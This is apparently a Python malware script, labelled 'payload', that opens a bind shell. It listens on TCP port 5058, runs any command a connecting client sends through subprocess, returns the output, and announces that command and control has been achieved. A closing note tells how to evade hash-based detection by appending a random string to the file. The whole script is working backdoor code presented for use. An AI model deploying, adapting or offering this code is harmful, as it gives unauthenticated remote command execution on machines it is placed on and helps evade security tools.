## payload

import subprocess as sp
import socket
import threading

PORT = 5058

#SERVER = "192.168.0.10"
HEADER = 64
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER,PORT)

DISCONNECT_MESSAGE = "!quit"

FORMAT = 'utf-8'

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)


def handle_client(conn,addr):    
    ## sends C & C notice for first time connectors
    first_time = True

    connected = True
    while connected: 
        try:
            msg_length = conn.recv(HEADER).decode(FORMAT)
            if msg_length:
                msg_length = int(msg_length)

                msg = conn.recv(msg_length).decode(FORMAT)
                
                ## catching disconnect
                if msg == DISCONNECT_MESSAGE:
                    output = "Disconnecting"
                    connected = False
                
                ## catching accidental enter keys
                elif msg == "":
                    conn.send(str("EMPTY - Try again").encode(FORMAT))
                
                ## running commands
                else:
                    output = sp.getoutput(msg)
                    print(output)
                    conn.send(str(output).encode(FORMAT))
                
                if first_time == True:
                    conn.send(f"Command and Control on {ADDR} achieved".encode(FORMAT))

                
        except Exception as e:
            conn.send(f"ERROR: {e}".encode(FORMAT))

        first_time = False
    conn.close()

    

def start():
    server.listen()

    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()
        #print(f"[CONNECTIONS] {threading.active_count()-1}")


if __name__ == "__main__":
    start()

## notes:
## defeat detection by hashing by adding a random string to the end of this file (commented out)